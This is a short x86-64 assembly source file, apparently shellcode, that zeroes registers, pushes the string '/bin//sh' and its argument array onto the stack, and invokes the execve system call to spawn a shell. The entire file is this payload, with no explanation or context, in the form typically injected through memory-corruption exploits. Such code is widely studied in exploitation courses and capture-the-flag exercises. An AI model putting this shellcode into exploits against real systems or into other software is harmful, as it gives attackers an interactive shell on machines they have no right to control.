section .text
  global _start
    _start:
      xor rdx, rdx
      push rdx
      mov rax, "/bin//sh"
      push rax
      mov rdi, rsp

      push rdx
      push rdi
      mov rsi, rsp

      xor rax, rax
      mov al, 0x3b
      syscall
